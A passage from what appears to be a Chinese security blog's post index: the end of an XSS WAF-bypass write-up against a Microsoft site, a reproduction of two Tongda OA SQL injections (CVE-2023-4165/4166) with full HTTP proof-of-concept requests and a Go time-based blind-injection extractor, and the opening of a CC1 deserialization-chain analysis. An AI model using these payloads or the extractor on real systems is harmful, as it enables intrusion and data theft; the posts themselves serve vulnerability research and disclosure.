class=\"number\">26</span>%23x5c%<span class=\"number\">26</span>%23x75%<span class=\"number\">26</span>%23x30%<span class=\"number\">26</span>%23x30%<span class=\"number\">26</span>%23x36%<span class=\"number\">26</span>%23x31%<span class=\"number\">26</span>%23x5c%<span class=\"number\">26</span>%23x75%<span class=\"number\">26</span>%23x30%<span class=\"number\">26</span>%23x30%<span class=\"number\">26</span>%23x36%<span class=\"number\">26</span>%23x43%<span class=\"number\">26</span>%23x5c%<span class=\"number\">26</span>%23x75%<span class=\"number\">26</span>%23x30%<span class=\"number\">26</span>%23x30%<span class=\"number\">26</span>%23x36%<span class=\"number\">26</span>%23x35%<span class=\"number\">26</span>%23x5c%<span class=\"number\">26</span>%23x75%<span class=\"number\">26</span>%23x30%<span class=\"number\">26</span>%23x30%<span class=\"number\">26</span>%23x37%<span class=\"number\">26</span>%23x32%<span class=\"number\">26</span>%23x5c%<span class=\"number\">26</span>%23x75%<span class=\"number\">26</span>%23x30%<span class=\"number\">26</span>%23x30%<span class=\"number\">26</span>%23x37%<span class=\"number\">26</span>%23x34</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//xxxxx.microsoft.com/?s=%22ONclick=%26%23x5c%26%23x75%26%23x30%26%23x30%26%23x36%26%23x31%26%23x5c%26%23x75%26%23x30%26%23x30%26%23x36%26%23x43%26%23x5c%26%23x75%26%23x30%26%23x30%26%23x36%26%23x35%26%23x5c%26%23x75%26%23x30%26%23x30%26%23x37%26%23x32%26%23x5c%26%23x75%26%23x30%26%23x30%26%23x37%26%23x34%601%20</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"xn50cB_DFGfJLZszfuoIRqNLvRrtN2VGVolDSythKOU.png\" alt=\"image\"></p>\n<p>当我手动添加了反引号之后可以触发，但是当我输入两个反引号进行请求的时候，又被拦截了</p>\n<p><img src=\"W85CMroMpBVczpyI8MkHlyxkpTqTiQRs0rlwbLJxy0s.png\" alt=\"image\"></p>\n<p>弹窗函数又行不通了，经过查询资料发现一个可以绕该waf的payload</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg onload=alert&amp;#0000000040document.cookie)&gt;</span><br></pre></td></tr></table></figure>\n<p>修改为适合这里的；发现被拦截了</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//xxxxx.microsoft.com/?s=%22ONclick=alert%26%230000000040document.cookie)%20</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"尝试从反引号入手\"><a href=\"#尝试从反引号入手\" class=\"headerlink\" title=\"尝试从反引号入手\"></a>尝试从反引号入手</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">html编码   &amp;#x00000000000060</span><br><span class=\"line\">url编码    %<span class=\"number\">26</span>%<span class=\"number\">23</span>%<span class=\"number\">78</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">36</span>%<span class=\"number\">30</span></span><br></pre></td></tr></table></figure>\n<p>请求发现被拦截，单个的时候正常</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//xxxxx.microsoft.com/</span></span><br><span class=\"line\">?s=%22ONclick=alert%<span class=\"number\">26</span>%<span class=\"number\">23</span>%<span class=\"number\">78</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">36</span>%30qqq%<span class=\"number\">26</span>%<span class=\"number\">23</span>%<span class=\"number\">78</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">30</span>%<span class=\"number\">36</span>%<span class=\"number\">30</span>%<span class=\"number\">20</span></span><br></pre></td></tr></table></figure>\n\n\n<p>到这里的时候，心态已经崩了。</p>\n<h2 id=\"尝试throw\"><a href=\"#尝试throw\" class=\"headerlink\" title=\"尝试throw\"></a>尝试throw</h2><p>尝试throw绕过;失败了。</p>\n<p>现在捋一下思路发现：</p>\n<ul>\n<li>1.同时出现事件函数、等于号、双反引号或者双圆括号就会被拦截</li>\n<li>2.且不管是通过各种编码实现的上述内容，入事件函数，弹窗函数，反引号，只要最终能触发XSS弹窗的，就会被拦截。</li>\n<li>3.单独出现，或者出现三者的其二都是可以正常访问</li>\n</ul>\n<h2 id=\"尝试添加额外字符扰乱（成功）\"><a href=\"#尝试添加额外字符扰乱（成功）\" class=\"headerlink\" title=\"尝试添加额外字符扰乱（成功）\"></a>尝试添加额外字符扰乱（成功）</h2><p>尝试添加空格等其它字符进行干扰waf的判断</p>\n<p>在html的标签中，不同位置的空格绕过方式不是一样的</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;&lt;imgAAAsrcAAAonerrorBBB=BBBalertCCC(<span class=\"number\">1</span>)DDD&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">A位置： /，/<span class=\"number\">123</span>/，%09，%0A，%0C，%<span class=\"number\">0D</span>，%<span class=\"number\">20</span></span><br><span class=\"line\">B位置：%09，%0A，%0C，%<span class=\"number\">0D</span>，%<span class=\"number\">20</span></span><br><span class=\"line\">C位置：%0B，<span class=\"comment\">/**/ （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20）</span></span><br><span class=\"line\"><span class=\"comment\">D位置：%09，%0A，%0C，%0D，%20，//，&gt;</span></span><br></pre></td></tr></table></figure>\n<p>尝试在alert前后添加空格被拦截;也就是BBB和CCC</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;h1 ONclick=空格alert`<span class=\"number\">1</span>` &gt;hello&lt;/h1&gt;</span><br></pre></td></tr></table></figure>\n<p>尝试在弹窗内容后添加空格被拦截;也就是DDD</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;h1 ONclick=alert`<span class=\"number\">1</span>`空格&gt;hello&lt;/h1&gt;</span><br><span class=\"line\">&lt;h1 ONclick=alert`<span class=\"number\">1</span>空格`&gt;hello&lt;/h1&gt;</span><br></pre></td></tr></table></figure>\n<p>尝试在触发函数中添加空格，也就是AAA和BBB</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;h1 ONclick空格=alert`<span class=\"number\">1</span>`&gt;hello&lt;/h1&gt;</span><br></pre></td></tr></table></figure>\n<p>在BBB中添加 %0C 成功（%09、%0A、%0D被拦截；%20位置错乱）、</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;h1 ONclick空格=alert`<span class=\"number\">1</span>`&gt;hello&lt;/h1&gt;</span><br></pre></td></tr></table></figure>\n<p>完整的payload为</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//xxxxx.microsoft.com/?s=%22onmouseover%0C=prompt%60hello_microsoft_xss%60%20</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"0W51WPSvn9QFWcwWRbs2metRnFDu-LeWFrDNyFjGDeI.png\" alt=\"image\"></p>\n<p><img src=\"7RhNWH0LpIriLtTtjwkCUp3ZTtsNdiZHocH_039CJ5E.png\" alt=\"image\"></p>\n<p><img src=\"rrZKoYQ7UbtkWmuw5p2mfV_tPHZnQqhd1-iaINHOuXc.png\" alt=\"image\"></p>\n<p>在谷歌查看HTML</p>\n<p><img src=\"OVpeOfsNQGF97xSI9Jxyy2QAcOjk8oeDjeR7KHj7N4Y.png\" alt=\"image\"></p>\n<p>在火狐中查看HTML；发现多了个\f 但无影响函数的触发</p>\n<p><img src=\"zAtlnEMW3IDw5bVa4OJBAF_iZyO1SpV7OufnoDek4GM.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>国外的WAF真牛逼，只要我的不是完整的payload就不会触发拦截，而且不会针对性的去拦截payload。经历了一番漫长的尝试终于绕过 WAF，提交给微软之后，怀着激动的心情等微软官方的好消息(微软的XSS漏洞一般都有1200-3000$)。过了几天微软赏金团队告知我该漏洞不在赏金计划的范围之内，无缘了微软的赏金，但微软会在自己的MSRC官网中对漏洞提交者进行鸣谢。</p>\n<p><img src=\"cyouecdhDaHjhWM3rvlkVdIBQq8p5L65PbsstzphKA8.png\" alt=\"image\"></p>\n<p><img src=\"PjKGs03xhChxWt6yOxAixjLN3Ps2QESt-YGEnMP_rQg.png\" alt=\"image\"></p>\n","categories":["实战记录"],"tags":["XSS","bypass waf"]},{"title":"通达OA俩SQL注入复现与分析","url":"/2023/08/10/%E9%80%9A%E8%BE%BEOA%E4%BF%A9SQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/","content":"<h1 id=\"通达OA俩SQL注入复现与分析\"><a href=\"#通达OA俩SQL注入复现与分析\" class=\"headerlink\" title=\"通达OA俩SQL注入复现与分析\"></a>通达OA俩SQL注入复现与分析</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>又是各种day的poc满天飞，我今天挑个通达OA的POC来验证一下其真实性，在此写下文章来分析记录一下。</p>\n<p><em>声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</em></p>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>下载地址：<a href=\"https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe\">https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe</a></p>\n<p><img src=\"np0cqC-ZtoHBUc6CPnTPQx8DSxiwOs2LbZJ1MnIVFGI.png\" alt=\"image\"></p>\n<p>服务启动</p>\n<p><img src=\"S2CIMEicu1MBIEk5F0vg-cmOaY5WIX4dGAB6NKDPi88.png\" alt=\"image\"></p>\n<p>利用admin账号成功登录，密码默认为空</p>\n<p><img src=\"SLJtnd44OVe1lg3IEE0GC-Vg0VQ9_ucdifOtfUGdy2o.png\" alt=\"image\"></p>\n<h2 id=\"漏洞分析（CVE-2023-4165）\"><a href=\"#漏洞分析（CVE-2023-4165）\" class=\"headerlink\" title=\"漏洞分析（CVE-2023-4165）\"></a>漏洞分析（<strong>CVE-2023-4165</strong>）</h2><p>根据网传的poc，直接来看&#x2F;general&#x2F;system&#x2F;seal_manage&#x2F;iweboffice&#x2F;delete_seal.php文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">require_once <span class=\"string\">&quot;inc/auth.inc.php&quot;</span>;</span><br><span class=\"line\">include_once <span class=\"string\">&quot;inc/header.inc.php&quot;</span>;</span><br><span class=\"line\">include_once <span class=\"string\">&quot;inc/utility_all.php&quot;</span>;</span><br><span class=\"line\">$CUR_TIME = date(<span class=\"string\">&quot;Y-m-d H:i:s&quot;</span>, time());</span><br><span class=\"line\">$DELETE_STR = rtrim($DELETE_STR, <span class=\"string\">&quot;,&quot;</span>);</span><br><span class=\"line\">$query = <span class=\"string\">&quot;delete from office_seal WHERE ID IN ($DELETE_STR)&quot;</span>;</span><br><span class=\"line\">exequery(TD::conn(), $query);</span><br><span class=\"line\">header(<span class=\"string\">&quot;location:manage.php?start=$start&quot;</span>);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>实现的功能是从数据库中删除指定的记录。前面三句是包含其它文件进来。然后第四句开始是创建了一个名为 $CUR_TIME 的变量，保存当前时间。当前时间可能是为了记录删除操作的时间戳。对 $DELETE_STR 变量进行处理，使用rtrim()  函数去掉末尾的逗号（,）。然后是构造了一个 SQL 查询语句，使用 $DELETE_STR 中的值作为 ID 列的筛选条件。</p>\n<p><img src=\"OoNX36HRXFQkPXYGpajEy3ZHZ9Aih80lkDxO5JYJh0w.png\" alt=\"image\"></p>\n<p>调用 exequery() 函数执行 SQL 查询；使用 header() 函数将请求重定向到另一个页面。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">exequery(TD::conn(), $query);</span><br><span class=\"line\">header(<span class=\"string\">&quot;location:manage.php?start=$start&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>分析到这里的时候，很明显的一个SQL语句拼接，确认存在SQL注入。</p>\n<p>但是我们看到前面是把inc&#x2F;auth.inc.php包含进来了的，也就是说需要有登录后的权限才能执行下面的删除操作。</p>\n<p><img src=\"JZYWNCzXgYQJDJA92G4Ec0Ag1wnZ-RROzVRJFdunDTM.png\" alt=\"image\"></p>\n<p>没登录的时候，直接访问则会显示“用户未登录，请重新登录!”</p>\n<p><img src=\"cW-kUaH8mS05UcG2WaAP_rWUtqwh8SQTPn0O7oA0kdE.png\" alt=\"image\"></p>\n<p>我们登录之后进行测试。发现是印章日志查询的功能。</p>\n<p><img src=\"eT_CApFo1dwMcLHzJFgstefYbFBMyYrm0usYFLoE8Ts.png\" alt=\"image\"></p>\n<p>尝试进行注入，试一下有没有过滤sleep</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.88.131/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and if(1 =1,sleep(5),1) AND (1) = (1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dQTJwnV2uhNTduIWpz6DzDth_Yi2OqcDIbhK_JNqzhw.png\" alt=\"image\"></p>\n<p>分析一下看到在inc&#x2F;conn.php中做了过滤。</p>\n<p>调用链为：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">inc/auth.inc.php(<span class=\"number\">3</span>)---&gt;inc/session.php(<span class=\"number\">77</span>)---&gt;inc/conn.php---(sql_injection)</span><br></pre></td></tr></table></figure>\n<p>在inc&#x2F;conn.php的sql_injection方法过滤了常见的SQL注入函数</p>\n<p><img src=\"awo04MA-NNvHeC1fXz6GTTDGuYNf5XDy4MQs67aWXtY.png\" alt=\"image\"></p>\n<p>尝试使用网传的poc进行请求</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=<span class=\"number\">1</span>)%20and%<span class=\"number\">20</span>(substr(DATABASE(),<span class=\"number\">1</span>,<span class=\"number\">1</span>))=<span class=\"type\">char</span>(<span class=\"number\">83</span>)%20and%<span class=\"number\">20</span>(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(<span class=\"number\">1</span>)=(<span class=\"number\">1</span> HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.131</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span> (Windows NT <span class=\"number\">10.0</span>; Win64; x64; rv:<span class=\"number\">109.0</span>) Gecko/<span class=\"number\">20100101</span> Firefox/<span class=\"number\">116.0</span></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,*<span class=\"comment\">/*;q=0.8</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: en-US,en;q=0.5</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">Connection: close</span></span><br><span class=\"line\"><span class=\"comment\">Upgrade-Insecure-Requests: 1</span></span><br><span class=\"line\"><span class=\"comment\">Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=po5cp18o8mov6bk99cd338a7e1</span></span><br><span class=\"line\"><span class=\"comment\">Cache-Control: max-age=0</span></span><br></pre></td></tr></table></figure>\n<p>使用DATABASE获取当前数据库名称，char(84)是ASCII码的T，看到有稍微延迟（推测是SQL语句匹配运行造成的）</p>\n<p><img src=\"FROEpmeUuGVjdXie9FgZRBuaLJLmaPUvnYahEFri6bI.png\" alt=\"image\"></p>\n<p>char(83)未延迟</p>\n<p><img src=\"2Wd53_RizcrBnBxKoVs29xK6a9VRNUvml02o-3sIT3o.png\" alt=\"image\"></p>\n<h2 id=\"漏洞分析（CVE-2023-4166）\"><a href=\"#漏洞分析（CVE-2023-4166）\" class=\"headerlink\" title=\"漏洞分析（CVE-2023-4166）\"></a>漏洞分析（<strong>CVE-2023-4166</strong>）</h2><p>这个漏洞其实和上面的那个差不多，只是漏洞点的位置不同，我们也来简单的看一下吧。</p>\n<p>&#x2F;general&#x2F;system&#x2F;seal_manage&#x2F;dianju&#x2F;delete_log.php</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">require_once <span class=\"string\">&quot;inc/auth.inc.php&quot;</span>;</span><br><span class=\"line\">include_once <span class=\"string\">&quot;inc/header.inc.php&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (substr($DELETE_STR, -<span class=\"number\">1</span>, <span class=\"number\">1</span>) == <span class=\"string\">&quot;,&quot;</span>) &#123;</span><br><span class=\"line\">\t$DELETE_STR = substr($DELETE_STR, <span class=\"number\">0</span>, -<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$query = <span class=\"string\">&quot;delete from SEAL_LOG WHERE LOG_ID IN ($DELETE_STR)&quot;</span>;</span><br><span class=\"line\">exequery(TD::conn(), $query);</span><br><span class=\"line\">header(<span class=\"string\">&quot;location:log.php?start=$start&quot;</span>);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>简单分析看了下，大概功能是从”SEAL_LOG”表中删除指定的日志。根据传入的参数$DELETE_STR，该脚本构建了一个DELETE语句，并使用exequery()函数执行该查询。最后还来了割重定向，和上面的那段代码也是非常相似的。也包含了inc&#x2F;auth.inc.php</p>\n<p><img src=\"pJfAP9s9Vp86zdzjoOdBH_88BZA092aWVB0ErazT_B8.png\" alt=\"image\"></p>\n<p>我们就直接上POC了，POC和上面一模一样。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=<span class=\"number\">1</span>)%20and%<span class=\"number\">20</span>(substr(DATABASE(),<span class=\"number\">1</span>,<span class=\"number\">1</span>))=<span class=\"type\">char</span>(<span class=\"number\">84</span>)%20and%<span class=\"number\">20</span>(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(<span class=\"number\">1</span>)=(<span class=\"number\">1</span> HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.131</span></span><br><span class=\"line\">User-Agent: Mozilla/<span class=\"number\">5.0</span> (Windows NT <span class=\"number\">10.0</span>; Win64; x64; rv:<span class=\"number\">109.0</span>) Gecko/<span class=\"number\">20100101</span> Firefox/<span class=\"number\">116.0</span></span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=<span class=\"number\">0.9</span>,image/avif,image/webp,*<span class=\"comment\">/*;q=0.8</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Language: en-US,en;q=0.5</span></span><br><span class=\"line\"><span class=\"comment\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"comment\">Connection: close</span></span><br><span class=\"line\"><span class=\"comment\">Upgrade-Insecure-Requests: 1</span></span><br><span class=\"line\"><span class=\"comment\">Cookie: Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=4fb6c477; PHPSESSID=brpsncea78tf3qv8jgpdr69d20</span></span><br><span class=\"line\"><span class=\"comment\">Cache-Control: max-age=0</span></span><br></pre></td></tr></table></figure>\n<p>延迟两秒多</p>\n<p><img src=\"I0nY_rrTd4NON_Gv7-oVViSEbxxABU0blZ75pzc2LMQ.png\" alt=\"image\"></p>\n<p>延迟一秒左右</p>\n<p><img src=\"Jbc-OY30ZVSdJkz_pX7kMYS8j-5QzMkquAgBRJeipTs.png\" alt=\"image\"></p>\n<h2 id=\"工具编写\"><a href=\"#工具编写\" class=\"headerlink\" title=\"工具编写\"></a>工具编写</h2><p>根据上面分析的特性，当遇到正确的字符的时候延迟的时间会比错误的字符多一些。分别是两秒多，和秒左右。</p>\n<p>使用go编码的简单脚本，测试的POC是用于枚举当前所使用的数据库名称。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">import</span> <span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">\t<span class=\"string\">&quot;fmt&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t<span class=\"string\">&quot;net/http&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t<span class=\"string\">&quot;strings&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t<span class=\"string\">&quot;time&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">)</span></span><br><span class=\"line\"></span><br><span class=\"line\">func <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\turl := <span class=\"string\">&quot;http://192.168.88.131/general/system/seal_manage/dianju/delete_log.php&quot;</span>                                                                                     <span class=\"comment\">// 目标网站的URL</span></span><br><span class=\"line\">\tdelay := <span class=\"number\">2</span>                                                                                                                                                          <span class=\"comment\">// 延迟时间，单位为秒</span></span><br><span class=\"line\">\tcookieValue := <span class=\"string\">&quot;Hm_lvt_74ecab41a4d1845b3fab38f72ed0db35=1679966090; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=3d564868; PHPSESSID=po5cp18o8mov6bk99cd338a7e1&quot;</span> <span class=\"comment\">// 替换为有效的Cookie值</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tcharacters := <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&amp;*()+-&quot;</span> <span class=\"comment\">// 可能的字符集</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tresult := <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i := <span class=\"number\">1</span>; i &lt;= <span class=\"number\">30</span>; i++ &#123; <span class=\"comment\">// 假设字符的最大长度为30</span></span><br><span class=\"line\">\t\tfound := <span class=\"literal\">false</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> _, <span class=\"type\">char</span> := range characters &#123;</span><br><span class=\"line\">\t\t\tpayload := fmt.Sprintf(<span class=\"string\">&quot;1) and (substr(DATABASE(),%d,1))=char(%d) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1&quot;</span>, i, <span class=\"type\">int</span>(<span class=\"type\">char</span>)) <span class=\"comment\">// 构造payload</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">//print(payload, &quot;\\n&quot;)</span></span><br><span class=\"line\">\t\t\treq, err := http.NewRequest(<span class=\"string\">&quot;GET&quot;</span>, url, nil)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> err != nil &#123;</span><br><span class=\"line\">\t\t\t\tfmt.Println(<span class=\"string\">&quot;创建请求失败:&quot;</span>, err)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// 使用分号分隔的每个Cookie项</span></span><br><span class=\"line\">\t\t\tcookieItems := strings.Split(cookieValue, <span class=\"string\">&quot;; &quot;</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> _, item := range cookieItems &#123;</span><br><span class=\"line\">\t\t\t\titemSplit := strings.SplitN(item, <span class=\"string\">&quot;=&quot;</span>, <span class=\"number\">2</span>) <span class=\"comment\">// 按照等号（=）分隔键值对</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> <span class=\"title function_\">len</span><span class=\"params\">(itemSplit)</span> == <span class=\"number\">2</span> &#123;</span><br><span class=\"line\">\t\t\t\t\tcookie := &amp;http.Cookie&#123;</span><br><span class=\"line\">\t\t\t\t\t\tName:  itemSplit[<span class=\"number\">0</span>],</span><br><span class=\"line\">\t\t\t\t\t\tValue: itemSplit[<span class=\"number\">1</span>],</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t\treq.AddCookie(cookie)</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\treq.URL.RawQuery = <span class=\"string\">&quot;DELETE_STR=&quot;</span> + payload <span class=\"comment\">//构建请求，其DELETE_STR是本次的注入参数</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tstartTime := time.Now()</span><br><span class=\"line\">\t\t\tresp, err := http.DefaultClient.Do(req)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> err != nil &#123;</span><br><span class=\"line\">\t\t\t\tfmt.Println(<span class=\"string\">&quot;发送请求失败:&quot;</span>, err)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tdefer resp.Body.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tendTime := time.Now()</span><br><span class=\"line\">\t\t\tresponseTime := endTime.Sub(startTime)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> responseTime &gt;= time.Duration(delay)*time.Second &#123;</span><br><span class=\"line\">\t\t\t\tresult += string(<span class=\"type\">char</span>)</span><br><span class=\"line\">\t\t\t\tfound = <span class=\"literal\">true</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> !found &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfmt.Println(<span class=\"string\">&quot;Database: &quot;</span> + result)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>CVE-2023-4166获取当前数据库名称</strong></p>\n<p><img src=\"bSC8Ul2fUuNzPwgdgeHbyLEXFJlo6SzOp9GVx7WIDHc.png\" alt=\"image\"></p>\n<p><strong>CVE-2023-4165获取当前数据库名称</strong></p>\n<p><img src=\"r-HFac3C3wr14eUFJ6UDgqOC0LABfPq4peEBnxZd728.png\" alt=\"image\"></p>\n<p>结果正确</p>\n<p><img src=\"Vk5VTUjI-fRXAIxf5rBC1eJfae3lKJYBdlbuUYTHsVo.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>1.两个漏洞很相似</p>\n<p>2.漏洞点很容易看到，但想要利用起来还得进行更深入的绕过。</p>\n","categories":["漏洞复现"],"tags":["漏洞复现","SQL注入"]},{"title":"CC1链分析","url":"/2023/06/12/CC1%E9%93%BE%E5%88%86%E6%9E%90/","content":"<h1 id=\"CC1链分析\"><a href=\"#CC1链分析\" class=\"headerlink\" title=\"CC1链分析\"></a>CC1链分析</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Apache Commons Collections是一个第三方的基础类库，提供了很多强有力的数据结构类型并且实现了各种集合工具类，可以说是apache开源项目的重要组件。在Java 8u71以后的版本中修改了触发的类，从而不再支持该利用链的使用。</p>\n<p><em>声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</em></p>\n<h2 id=\"8u65-jdk的Java文件环境搭建\"><a href=\"#8u65-jdk的Java文件环境搭建\" class=\"headerlink\" title=\"8u65 jdk的Java文件环境搭建\"></a>8u65 jdk的Java文件环境搭建</h2><p>为什么做这个步骤？</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">因为在导入的jdk的包里面都是编译后的.class文件，当我们在分析调用链或者搜索的时候无法搜索到jdk里面的.class的内容。有了这个步骤，我们可以搜索和jdk源码一样的Java代码，更有助于我们分析。</span><br></pre></td></tr></table></figure>\n<p>下载地址：<a 